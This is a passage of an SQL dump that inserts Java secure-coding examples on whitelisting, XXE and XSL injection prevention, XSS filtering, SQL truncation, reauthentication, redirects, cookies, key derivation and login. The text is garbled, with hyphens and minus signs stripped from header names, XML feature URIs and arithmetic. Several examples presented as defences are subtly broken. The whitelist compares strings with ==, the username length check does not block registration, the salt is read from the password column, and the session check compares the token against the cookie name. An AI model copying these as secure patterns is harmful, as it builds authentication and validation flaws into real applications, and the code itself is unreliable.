            sb.append(toHexString(address, 4));
            sum += (address & 0xFF00) >> 8;
            sum += address & 0xFF;
            address += bytes.size();
            sb.append("00");
            for (Integer b : bytes) {
                sum += b;
                sb.append(toHexString(b, 2));
            }
            sb.append(toHexString((~(sum & 0xFF) + 1) & 0xFF, 2));
            bytes.clear();
            return sb.toString();
        }

        private String toHexString(int i, int len) 
        {
            String hex = Long.toHexString(i).toUpperCase();
            if (len == 2) 
            {
                if (hex.length() == 1) 
                {
                    return "0" + hex;
                }else{
                    return hex;
                }
            }else{
                if (hex.length() == 1) 
                {
                    return "000" + hex;
                } else if (hex.length() == 2) 
                {
                    return "00" + hex;
                } else if (hex.length() == 3) 
                {
                    return "0" + hex;
                }else{
                    return hex;
                }
            }
        }
    }

', 'Randomizer function', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Whitelisting function


 Example:


    package com.edw;
    import org.apache.log4j.Logger;

    public final class WhiteList
    {   
        final static Logger logger = Logger.getLogger(WhiteList.class);
        public boolean WhiteListing(String allowed, String input)
        {
            /*
            Here we define a white list of pages we want the user to be allowed to be redirected to, all 
            patterns are terminated whenever they not comply with the predefined white list
            */
            
            String[] pattern = allowed.split(",");
            //For validation if the file returned true
            boolean validated = false;
            //To catch the user submitting evil requests we count the number of times the for loop hits false
            int count = 0;
            int countArray = 0;
                    
            for( int i = 0; i < pattern.length; i++)
            {
                String item = pattern[i];
                
                //If filename is equal to the predefined items
                if ( input == item)
                {
                    validated = true ; 
                    count = 1;
                }
                
                //Here we increase the counts, if they are equal we know the function did not hit a valid filename
                count++;
                countArray++;
            }
            
            if (countArray == count)
            { 
                //this breach has to be reported into the log files
                validated = false;
                logger.info("Audit log message!" + "FAIL" + "HIGH");   
            }
            return validated;   
        } 
    }
    

', 'Whitelisting function', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Charsets 


 Example:


	/*
	In order to set the "Charsets" header you''ll have to add the 
	following code to the head of your application, the following code could be used in your controller 
	for by example, text/html:
	*/

	response.addHeader("ContentType: text/html", "charset=utf8");

	/*
	Or directly into your html markup:
	*/

	<meta httpequiv="ContentType" content="text/html; charset=utf8">
    		', 'Charsets', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentTypeOptions header


 Example:


    /*
    In order to set the "XContentTypeOptions" header you''ll have to add the 
    following code to the head of your application, the following code could be used in your controller:
    */

    response.appendHeader("XContentTypeOptions", "nosniff");
', 'X Content Type Options header', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML External Entities 


 Example:

    
    /*
    The overall prevention method for loading external entities is adding the following line of code:
    This line of code function tells the underlying libxml parsing to not try to interpret the values 
    of the entities in the incoming XML and leave the entity references intact.

    Both DocumentBuilderFactory and SAXParserFactory XML Parsers can be configured using the same techniques to protect them against XXE.The JAXP DocumentBuilderFactory setFeature method allows a developer to control which implementationspecific XML processor features are enabled or disabled. The features can either be set on the factory or the underlying XMLReader setFeature method. Each XML processor implementation has its own features that govern how DTDs and external entities are processed.
    */

    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    String FEATURE = null;

    //or

    SAXParserFactory spf = SAXParserFactory.newInstance();
    SAXParser saxParser = spf.newSAXParser();
    XMLReader reader = saxParser.getXMLReader();
      
    

    //  DocumentBuilderFactory
    import javax.xml.parsers.DocumentBuilderFactory;
    import javax.xml.parsers.ParserConfigurationException; // catching unsupported features

    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        String FEATURE = null;
        try {
            // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all XML entity attacks are prevented
            // Xerces 2 only  http://xerces.apache.org/xerces2j/features.htmldisallowdoctypedecl
            FEATURE = "http://apache.org/xml/features/disallowdoctypedecl";
            dbf.setFeature(FEATURE, true);

            // If you can''t completely disable DTDs, then at least do the following:
            // Xerces 1  http://xerces.apache.org/xercesj/features.htmlexternalgeneralentities
            // Xerces 2  http://xerces.apache.org/xerces2j/features.htmlexternalgeneralentities
            // JDK7+  http://xml.org/sax/features/externalgeneralentities    
            FEATURE = "http://xml.org/sax/features/externalgeneralentities";
            dbf.setFeature(FEATURE, false);

            // Xerces 1  http://xerces.apache.org/xercesj/features.htmlexternalparameterentities
            // Xerces 2  http://xerces.apache.org/xerces2j/features.htmlexternalparameterentities
            // JDK7+  http://xml.org/sax/features/externalparameterentities    
            FEATURE = "http://xml.org/sax/features/externalparameterentities";
            dbf.setFeature(FEATURE, false);

            // Disable external DTDs as well
            FEATURE = "http://apache.org/xml/features/nonvalidating/loadexternaldtd";
            dbf.setFeature(FEATURE, false);

            // and these as well, per Timothy Morgan''s 2014 paper: "XML Schema, DTD, and Entity Attacks" (see reference below)
            dbf.setXIncludeAware(false);
            dbf.setExpandEntityReferences(false);
    
            // And, per Timothy Morgan: "If for some reason support for inline DOCTYPEs are a requirement, then 
            // ensure the entity settings are disabled (as shown above) and beware that SSRF attacks
            // (http://cwe.mitre.org/data/definitions/918.html) and denial 
            // of service attacks (such as billion laughs or decompression bombs via "jar:") are a risk."

            // remaining parser logic
            ...
    
            } catch (ParserConfigurationException e) {
                // This should catch a failed setFeature feature
                logger.info("ParserConfigurationException was thrown. The feature ''" +
                            FEATURE +
                            "'' is probably not supported by your XML processor.");
                ...
            }
            catch (SAXException e) {
                // On Apache, this should be thrown when disallowing DOCTYPE
                logger.warning("A DOCTYPE was passed into the XML document");
                ...
            }
            catch (IOException e) {
                // XXE that points to a file that doesn''t exist
                logger.error("IOException occurred, XXE may still possible: " + e.getMessage());
                ...
            }
        
        
        
    
        
    // SAXParserFactory
        
    import javax.xml.parsers.ParserConfigurationException;  // catching unsupported features
    import javax.xml.parsers.SAXParser;
    import javax.xml.parsers.SAXParserFactory;
    
    import org.xml.sax.SAXNotRecognizedException;  // catching unknown features
    import org.xml.sax.SAXNotSupportedException;  // catching known but unsupported features
    import org.xml.sax.XMLReader;
    
    ...
    
        SAXParserFactory spf = SAXParserFactory.newInstance();
        SAXParser saxParser = spf.newSAXParser();
        XMLReader reader = saxParser.getXMLReader();
    
        try {
            // Xerces 1  http://xerces.apache.org/xercesj/features.htmlexternalgeneralentities
            // Xerces 2  http://xerces.apache.org/xerces2j/features.htmlexternalgeneralentities
    
            // Using the SAXParserFactory''s setFeature
            spf.setFeature("http://xml.org/sax/features/externalgeneralentities", false);
            // Using the XMLReader''s setFeature
            reader.setFeature("http://xml.org/sax/features/externalgeneralentities", false);
    
            // Xerces 2 only  http://xerces.apache.org/xercesj/features.htmlexternalgeneralentities
            spf.setFeature("http://apache.org/xml/features/disallowdoctypedecl", true);
    
            // remaining parser logic
          ...
    
        } catch (ParserConfigurationException e) {
          // Tried an unsupported feature.
    
        } catch (SAXNotRecognizedException e) {
          // Tried an unknown feature.
    
        } catch (SAXNotSupportedException e) {
          // Tried a feature known to the parser but unsupported.
    
        } catch ... {
          
        }
    ...
', 'XML External Entities', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSL Injection Prevention 


 Example:


    /*
    In order to prevent XSL injections you must enforce strict policy''s whenever the
    files are loaded from a source controlled by a possible attacker.

    Let''s say for example that the user can choose from several XSL files on your application.

    ABC.xsl arranges your employee names on alphabetical order
    CBA.xsl just shows the input by order of your XML file.

    Before attaching the XSL files to the style sheet we first want to 
    do validation on the request to make sure the included file was one of our own predefined files
    */

    package com.edw;

    import java.io.File;
    import java.io.IOException;

    import javax.xml.parsers.DocumentBuilder;
    import javax.xml.parsers.DocumentBuilderFactory;
    import javax.xml.parsers.FactoryConfigurationError;
    import javax.xml.parsers.ParserConfigurationException;
    import javax.xml.transform.OutputKeys;
    import javax.xml.transform.Source;
    import javax.xml.transform.Transformer;
    import javax.xml.transform.TransformerException;
    import javax.xml.transform.TransformerFactory;
    import javax.xml.transform.dom.DOMResult;
    import javax.xml.transform.dom.DOMSource;
    import org.w3c.dom.ls.LSSerializer;
    import org.w3c.dom.Document;
    import org.xml.sax.SAXException;
    import org.w3c.dom.ls.DOMImplementationLS;

    public class IncludeXSL {

        private WhiteList wt = new WhiteList();
        
        public String includeXSL(String WhiteListing, String input)
        {
            LSSerializer serializer = null ;
            boolean continue_ = true;
            Document result = null;
            
            /*
            We want to WhiteList the paged for expected values, in this example they are,
            page1,page2 etc.. for more information about WhiteListing see "whitelisting" in the code examples:
            */
            
            if (wt.WhiteListing(WhiteListing, input) == false) { continue_ = false; }
            
            //If all went good we do the function
            if(continue_)
            {
                //LOAD XML FILE
                //Load the XML source
                Document xslt = null; 
                Document xml = null; 
                try {
                    File fXmlFile = new File(input);
                    DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
                    DocumentBuilder db = dbFactory.newDocumentBuilder();      
                    xml  = db.newDocument();
                    xslt = db.parse(fXmlFile);
                } catch (SAXException | IOException | ParserConfigurationException e) {
                    
                }
                
                xml.appendChild(xml.createElementNS(null, "root"));
                try {
                    result = transformXML(xml, xslt);
                } catch (TransformerException | ParserConfigurationException | FactoryConfigurationError e) {
                    
                }
                serializer = ((DOMImplementationLS) xml.getImplementation()).createLSSerializer();
            }
            return serializer.writeToString(result); 
        }
        
        //Configure the transformer
        public static Document transformXML(Document xml, Document xslt) throws TransformerException, ParserConfigurationException, FactoryConfigurationError {

            Source xmlSource = new DOMSource(xml);
            Source xsltSource = new DOMSource(xslt);
            DOMResult result = new DOMResult();

            // the factory pattern supports different XSLT processors
            TransformerFactory transFact = TransformerFactory.newInstance();
            Transformer trans = transFact.newTransformer(xsltSource);
            trans.setOutputProperty(OutputKeys.ENCODING, "UTF8");
            trans.transform(xmlSource, result);
            Document resultDoc = (Document) result.getNode();

            return resultDoc;
        }
    }

', 'XSL Injection Prevention', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSS filtering


 Example:


		package com.edw;

		import org.owasp.esapi.ESAPI;
		import org.jsoup.Jsoup;
		import org.jsoup.safety.Whitelist;

		public final class XssFilter {

			/**
			* Strips any potential XSS threats out of the value
			* @param value
			* @return
			*/
			public String filter( String value ) {
			    if( value == null )
							return null;
			
				// Use the ESAPI library to avoid encoded attacks.
				value = ESAPI.encoder().canonicalize( value );
			
				// Avoid null characters
				value = value.replaceAll("\0", "");
			
				// Clean out HTML
				value = Jsoup.clean( value, Whitelist.none() );
			
				return value;
			}	
		}

', 'XSS Filtering', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' User registration SQL truncation prevention


 Example:


	/*
	In order to prevent Column truncation SQL injection Solution we have to make sure the
	applications structural logic does not mismatches with the database structural logic.
	To achieve this imagine the follow example of a database structure of a users table

	TABLE users
	
	|        *Name*        |    *Type*        |    *Extra*     |
	
	|        userID        |    Int(11)       | AUTO_INCREMENT |
	
	|       Username       |    char(21)      |                |
	
	|       Password       |  Varchar(255)    |                |
	
	|      PrivilegeID     |    Int(11)       |                |
	
	*/


	package com.edw;

	import java.io.UnsupportedEncodingException;
	import java.security.InvalidKeyException;
	import java.security.NoSuchAlgorithmException;
	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.time.LocalDateTime;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class RegisterUser {
		
		private AuditLog Log = new AuditLog();
		private Hashing hash = new Hashing();
		final static Logger logger = Logger.getLogger(RegisterUser.class);
		
		public boolean userCheck(String username){
			
			boolean isTrue = false; 
			//Here we connect to the database by means of a connection configured in the web.xml and /METAINF/context.xml 
			Connection conn = null;
			try {
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				String query = "SELECT * FROM members WHERE username = ?";
			
				//We bind the parameter in order to prevent SQL injections
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, username);
				
				// execute the query, and get a java result set

				ResultSet rs = st.executeQuery();
				
				if (!rs.isBeforeFirst() && !rs.next())
				{
					isTrue = true;
				}
				
				st.close();
				conn.close();
				
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}
			return isTrue;
		}
		
		public boolean userRegister(String username, String password, int privID){

			boolean isTrue = false;
			
			/*
			Whenever the user gains the ability to register himself or change his user
			credentials you must always enforce the application to compare the length of the
			submitted string against the length of the allowed string length in your database
			structure in order to prevent SQL column truncation.
			*/
			
			int length = username.length(); 
			/*
			We now compare the length of the username against the allowed string length in
			The database structure
			*/
			if(length >= 21){
				//If length is to large the function must return false and the result must be logged.
				Log.SetLog(username, "Username was to long!", "FAIL!", LocalDateTime.now(), null);
			}
			
			//If true then register the user!       
			if(this.userCheck(username) == true){
				isTrue = true;
				
				//Then we encrypt the password
				String salt = "";
				String passhash = "";
				try {
					salt = hash.createSalt(password);	    	 
					passhash = hash.hashPassword(salt, password);
				} catch (InvalidKeyException | NoSuchAlgorithmException | UnsupportedEncodingException e) {
					logger.error("Error in hashing algorithm " + e.toString();
				}   
				
				//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
				Connection conn = null;
				try {	
					Context initContext = new InitialContext();
					Context webContext  = (Context)initContext.lookup("java:/comp/env");
					DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
					conn = ds.getConnection();	
					
					//After successful validation we enter the new user into the database
					String query = "INSERT INTO users"
							+ " (Username, Password, PrivilegeID)"
							+ " VALUES"
							+ " (?, ?, ?)";
						
					PreparedStatement st = conn.prepareStatement(query);
					
					st.setString(1, username);
					st.setString(2, passhash);
					st.setInt(3, privID);

					ResultSet rs = st.executeQuery();
							
					rs.close();
					st.close();
					conn.close();
					
				} catch (SQLException | NamingException e) {
						logger.error("cannot search database. check query" + e.toString() );
				}
			}else{
				Log.SetLog("", "Username" + username + " already exists!", "FAIL!", LocalDateTime.now(), null);
				isTrue = false ;
			}
			return isTrue;
		}	
	}
    ', 'User Registration SQL truncation prevention', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reauthentication 


 Example:


	package com.edw;

	import java.io.IOException;
	import java.net.HttpCookie;
	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.time.LocalDateTime;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.servlet.ServletException;
	import javax.servlet.annotation.WebServlet;
	import javax.servlet.http.Cookie;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;
	import javax.sql.DataSource;
	import java.util.UUID;

	import org.apache.log4j.Logger;

	import com.ning.http.client.Request;

	/**
	* Servlet implementation class Reauth
	*/
	@WebServlet("/Reauth")
	public final class Reauth extends HttpServlet {
		private static final long serialVersionUID = 1L;
		private int userID; 
		private String username; 
		private String password; 
		private String access; 
		private String salt; 
		private int privilege; 
		private boolean loggedin = false;
		final static Logger logger = Logger.getLogger(Reauth.class);
		
		AuditLog Log = new AuditLog();

		//Second we include the password hash.
		Hashing hash = new Hashing();

		//Third we include the random password/token class.
		Randomizer CSRF = new Randomizer();
		
		/**
		* @see HttpServletHttpServlet()
		*/
		public Reauth() {
			super();
		}

		/**
		* @see HttpServletdoGet(HttpServletRequest request, HttpServletResponse response)
		*/
		protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			response.getWriter().append("Served at: ").append(request.getContextPath());
		}

		/**
		* @see HttpServletdoPost(HttpServletRequest request, HttpServletResponse response)
		*/
		protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			
			loggedin = reAuthentication(request,response);
			
			if (loggedin == false)
			{
				request.getSession().invalidate();
				request.getSession().setAttribute("Authenticated", "");
				
				Cookie cookie = null;
				Cookie[] cookies = null;
				// Get an array of Cookies associated with this domain
				cookies = request.getCookies();
					
				for (Cookie cookie2 : cookies) {
					cookie = cookie2;
						
					if (cookie.getName().equals("JSESSIONID"))
					{        	 
						cookie.setValue("");
					}         
					response.addCookie(null);
					request.setAttribute("msg","Session terminated!");
					request.getRequestDispatcher("/login.jsp").forward(request, response);
					return;
				}
			}
			doGet(request, response);
		}
		
		public boolean reAuthentication(HttpServletRequest request, HttpServletResponse response)
		{
			String passwordHash = "";
			//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
			Connection conn = null;
			try {		
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				String query = "SELECT * from users WHERE userID = ?";
			
				PreparedStatement st = conn.prepareStatement(query);
				st.setInt(1, userID);
				
				// execute the query, and get a java result set
				//We bind the parameter in order to prevent SQL injections
				ResultSet rs = st.executeQuery();
				while (rs.next())
				{
					passwordHash  = rs.getString("password");
					salt = rs.getString("password");
				}
				
				st.close();
				conn.close();
			
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}
			
			/*
			We validate the password see "Password storage(salting stretching Hashing)" in the code examples
			for more detailed information:
			*/
			if (hash.Validate(passwordHash, salt, password) == true)
			{
				//the connection has to be reported into the log files	
				Log.SetLog("Null", "login was OK!", "SUCCESS", LocalDateTime.now(), "NULL");

				/*
				This is is to prevent session fixation, after login we create a new cookie which
				we than use to authenticate. This value can not be fixated since it is set after 
				login.

				create a new UUID and save into the session:
				*/
		
				//All the random tokens will now be changed
				UUID uid = UUID.randomUUID();          
				String AuthToken = uid.toString();
				request.getSession().setAttribute("AuthToken", AuthToken);
				
				// now create a new cookie with this UUID value
				Cookie cookie = new Cookie("AuthToken",AuthToken);
				response.addCookie(cookie);

				/*
				Now we create a random value for our CSRF tokens. See "Random password/token generation" in
				the code examples for more detailed information:
				*/
				
				String CSRftoken = CSRF.generate(25);
				request.getSession().setAttribute("CSRF", CSRftoken);
				request.getSession().setAttribute("access", "Authenticated");

				loggedin = true;
			}else{
				//If things went wrong we destroy the entire session. see "logout" code example for more info:
				loggedin = false ;
			}
			return loggedin;
		}
	}
', 'Reauthentication', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Open Forwards and Redirects 


 Example:


    /*
    When using forwards & redirects you should make sure the URL is being explicitly 
    declared in the code and cannot be manipulated by an attacker like:
    */

    //response.Redirect("/login");

    /*
    Generally you should avoid getting input into the redirect which could contain
    userinput by any means. if for any reason this may not be feasible than you 
    should make a WhiteList input validation for the redirect like so:
    */

    package com.edw;

    public class OpenForwards {

        public boolean openForwards(String redirect)
        {
            WhiteList listMe = new WhiteList();
            boolean validated = true;

            //For more information about whitelisting see the "WhiteListing" code example:
            if (listMe.WhiteListing("page1,page2,page3", redirect) == false) { validated = false; }

            //return the value back to the servlet in order to handle redirection. 
            //if the variable validate is true then it will redirect
            
            return validated; 
        }  
    }
', 'Open Forwards and redirects', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure Session Cookies 


 Example:


    //Secure Flag

    //Benefit: Instructs the browser to never send the cookie over a HTTP request. The cookie can only be sent over HTTPS. This works //even if the user manually types in a request for HTTP. The HTTP request will be sent, but the browser will not send any cookies //marked as “SECURE”

    //Limitations: The HTTP Request is still sent and this could be manipulated by a man in the middle to perform convincing phishing //attacks (See Strict Transport Security for solution).

    //Example within HTTP Response:
    //Cookie: JSESSIONID=kljahsdf123; SECURE;

    //web.xml

    //Servlet 3.0 (Java EE 6) introduced a standard way to configure secure attribute for the session cookie, this can be done by //applying the following configuration in web.xml

    <sessionconfig>
    <cookieconfig>
    <secure>true</secure>
    </cookieconfig>
    </sessionconfig>

    //Tomcat

    //In Tomcat 6 if the first request for session is using https then it automatically sets secure attribute on session cookie. 

    //or programmatically 

    String sessionid = request.getSession().getId();
    response.setHeader("SETCOOKIE", "JSESSIONID=" + sessionid + "; secure");
    ', 'Secure Session Cookies', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' RFC 2898 password derivation compatible with .NET Rfc2898DeriveBytes


 Example:


	package com.edw;

	import java.io.UnsupportedEncodingException;
	import java.security.InvalidKeyException;
	import java.security.NoSuchAlgorithmException;

	import javax.crypto.Mac;
	import javax.crypto.spec.SecretKeySpec;

	/*
	 RFC 2898 password derivation compatible with .NET Rfc2898DeriveBytes class.
	*/

	public final class Rfc2898DeriveBytes
	{
		public static void main(String[] args) throws Exception
		{
			Rfc2898DeriveBytes rfc2898 = new Rfc2898DeriveBytes("*^@KK@!        ", "*^@KK@!".getBytes());

		}

		private Mac _hmacSha1;
		private byte[] _salt;
		private int _iterationCount;

		private byte[] _buffer = new byte[20];
		private int _bufferStartIndex = 0;
		private int _bufferEndIndex = 0;
		private int _block = 1;

		/**
		* Creates new instance.
		* 
		* @param password
		*            The password used to derive the key.
		* @param salt
		*            The key salt used to derive the key.
		* @param iterations
		*            The number of iterations for the operation.
		* @throws NoSuchAlgorithmException
		*             HmacSHA1 algorithm cannot be found.
		* @throws InvalidKeyException
		*             Salt must be 8 bytes or more. or Password cannot be null.
		*/
		public Rfc2898DeriveBytes(byte[] password, byte[] salt, int iterations) throws NoSuchAlgorithmException, InvalidKeyException
		{
			if ((salt == null) || (salt.length < 8))
			{
				throw new InvalidKeyException("Salt must be 8 bytes or more.");
			}
			if (password == null)
			{
				throw new InvalidKeyException("Password cannot be null.");
			}
			this._salt = salt;
			this._iterationCount = iterations;
			this._hmacSha1 = Mac.getInstance("HmacSHA1");
			this._hmacSha1.init(new SecretKeySpec(password, "HmacSHA1"));
		}

		/**
		* Creates new instance.
		* 
		* @param password
		*            The password used to derive the key.
		* @param salt
		*            The key salt used to derive the key.
		* @param iterations
		*            The number of iterations for the operation.
		* @throws NoSuchAlgorithmException
		*             HmacSHA1 algorithm cannot be found.
		* @throws InvalidKeyException
		*             Salt must be 8 bytes or more. or Password cannot be null.
		* @throws UnsupportedEncodingException
		*             UTF8 encoding is not supported.
		*/
		public Rfc2898DeriveBytes(String password, byte[] salt, int iterations) throws InvalidKeyException, NoSuchAlgorithmException, UnsupportedEncodingException
		{
			this(password.getBytes("UTF8"), salt, iterations);
		}

		/**
		* Creates new instance.
		* 
		* @param password
		*            The password used to derive the key.
		* @param salt
		*            The key salt used to derive the key.
		* @throws NoSuchAlgorithmException
		*             HmacSHA1 algorithm cannot be found.
		* @throws InvalidKeyException
		*             Salt must be 8 bytes or more. or Password cannot be null.
		* @throws UnsupportedEncodingException
		*             UTF8 encoding is not supported.
		*/
		public Rfc2898DeriveBytes(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeyException, UnsupportedEncodingException
		{
			this(password, salt, 0x3e8);
		}

		/**
		* Returns a pseudorandom key from a password, salt and iteration count.
		* 
		* @param count
		*            Number of bytes to return.
		* @return Byte array.
		*/
		public byte[] GetBytes(int count)
		{
			byte[] result = new byte[count];
			int resultOffset = 0;
			int bufferCount = this._bufferEndIndex  this._bufferStartIndex;

			if (bufferCount > 0)
			{ // if there is some data in buffer
				if (count < bufferCount)
				{ // if there is enough data in buffer
					System.arraycopy(this._buffer, this._bufferStartIndex, result, 0, count);
					this._bufferStartIndex += count;
					return result;
				}
				System.arraycopy(this._buffer, this._bufferStartIndex, result, 0, bufferCount);
				this._bufferStartIndex = this._bufferEndIndex = 0;
				resultOffset += bufferCount;
			}

			while (resultOffset < count)
			{
				int needCount = count  resultOffset;
				this._buffer = this.func();
				if (needCount > 20)
				{ // we one (or more) additional passes
					System.arraycopy(this._buffer, 0, result, resultOffset, 20);
					resultOffset += 20;
				}else{
					System.arraycopy(this._buffer, 0, result, resultOffset, needCount);
					this._bufferStartIndex = needCount;
					this._bufferEndIndex = 20;
					return result;
				}
			}
			return result;
		}

		private byte[] func()
		{
			this._hmacSha1.update(this._salt, 0, this._salt.length);
			byte[] tempHash = this._hmacSha1.doFinal(getBytesFromInt(this._block));

			this._hmacSha1.reset();
			byte[] finalHash = tempHash;
			for (int i = 2; i <= this._iterationCount; i++)
			{
				tempHash = this._hmacSha1.doFinal(tempHash);
				for (int j = 0; j < 20; j++)
				{
					finalHash[j] = (byte) (finalHash[j] ^ tempHash[j]);
				}
			}
			if (this._block == 2147483647)
			{
				this._block = 2147483648;
			}else{
				this._block += 1;
			}
			return finalHash;
		}

		private static byte[] getBytesFromInt(int i)
		{
			return new byte[] { (byte) (i >>> 24), (byte) (i >>> 16), (byte) (i >>> 8), (byte) i };
		}
	}

', 'Rfc2898 DeriveBytes', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Login Functionality 


 Example:


	package com.edw;

	import java.io.IOException;
	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.util.UUID;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.servlet.ServletException;
	import javax.servlet.http.Cookie;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class Login extends HttpServlet{

		final static Logger logger = Logger.getLogger(Login.class);
		private String password ;
		private String username;
		private int userID;
		private String salt;
		private String access ;
		private int privilege;

		//First we include the audit log class.
		Auditlog Log = new Auditlog();
			
		//Second we include the password hash.
		Hashing hash = new Hashing();

		//Third we include the random password/token class.
		Randomizer CSRF = new Randomizer();
			
		//Last we include the random InputValidation class.
		InputValidation validate = new InputValidation();
			
		/**
		* 
		*/
		private static final long serialVersionUID = 1L;
		@Override
		protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

			username = req.getParameter("username");
			this.checkSession(req, resp);
			String passwordHash = "";
			String userId = "";

			//we also validate the username input, if it was bad we empty the string:
			if (validate.validateInput(username, "alphanumeric", "Error in username", "LOW", "0") != true) { username = ""; }
		
			//Here we connect to the database by means of a connection string as configured in the web.xml 
			Connection conn = null;
			try {
					
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the user from the users table
				String query = "SELECT * from users WHERE username = ?";
			
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, username);
				
				//execute the query, and get a java resultset
				//We bind the parameter in order to prevent sql injections

				ResultSet rs = st.executeQuery();
				
				while (rs.next())
				{
					username   = rs.getString("username");
					passwordHash = rs.getString("password");
					salt = rs.getString("salt");
					userId = rs.getString("userID");
				}
				
				st.close();
				conn.close();
				
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}

			/*
			We validate the password see "Password storage(salting stretching Hashing)" in the code examples
			for more detailed information:
			*/
			if (hash.Validate(passwordHash, salt, password) == true)
			{
				/*
				This is is to prevent session fixation, after login we create a new cookie which
				we then use to authenticate. This value can not be fixated since it is set after 
				login.

				create a new UUID and save into the session:
				*/

				UUID uuid = UUID.randomUUID();
				String randomUUIDString = uuid.toString();
				req.getSession().setAttribute("AuthToken", randomUUIDString);  
				
				// now create a new cookie with this UUID value
				Cookie newCookie = new Cookie("AuthToken", randomUUIDString);        	 
				resp.addCookie(newCookie);
				
				//the connection has to be reported into the log files
				Log.SetLog("", "", "login was OK!", "SUCCESS", "NULL");
				
				/*
				Now we create a random value for our CSRF tokens. See "Random password token generation" in
				the code examples for more detailed information:
				*/
				String CSRftoken = CSRF.generate(25);
				
				//Set an accessor session.
				req.getSession().setAttribute("CSRF", CSRftoken);  
				
				/*
				Put id in a session for query identifier based authentication
				See "identifier based authentication" code example for more information
				*/
				req.getSession().setAttribute("userID", userId);
			}else{
				//the connection has to be reported into the log files
				Log.SetLog("", "null", "Login failed!", "FAIL", "NULL");
			
				req.setAttribute("msg","Session terminated!");
				req.getRequestDispatcher("/login.jsp").forward(req, resp);
				return;
			}	
			super.doGet(req, resp);
		}

		@Override
		protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
			super.doPost(req, resp);
		}

		//In this method we do a check if the sessions are ok
		public void checkSession(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
		{
			Cookie cookie = null;
			Cookie[] cookies = null;
			// Get an array of Cookies associated with this domain
			cookies = req.getCookies();
			
			String authtoken = " "; 
			for (int i = 0; i < cookies.length; i++){
				cookie = cookies[i];
					
				if (cookie.getName().equals("AuthToken"))
				{
					authtoken = cookie.getName(); 
				}
				
				//We use this try catch for whenever the cookie is dropped
				try{
					//Check sessions and cookies to see if they match
					if (!req.getSession().getAttribute("AuthToken").equals(authtoken) || req.getSession().getAttribute("AuthToken") != "access")
					{
						req.setAttribute("msg","Session terminated!");
						req.getRequestDispatcher("/login.jsp").forward(req, resp);
						return;
					}
				}catch (Exception e){
						logger.error(e.toString());
						req.getSession().removeAttribute("Authenticated");
						req.getSession().invalidate();
						req.getRequestDispatcher("/login.jsp").forward(req, resp);
						return;       
				}
			}    
		}
	}
', 'Login function', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML Output


 Example:

	      
	/*
	Whenever user input is displayed in the application all user input should be properly escaped 
	to prevent XSS injections.
	*/

	/*
	This escaping is used whenever you put the code straight into the html like:
	<span>YOUR USER INPUT</span>
	The attack bellow will now be outputted as,
	&lt;script&gt;alert(1337);&lt;/script&gt;
	*/

	import org.owasp.esapi.ESAPI;
	import org.owasp.esapi.errors.EncodingException;

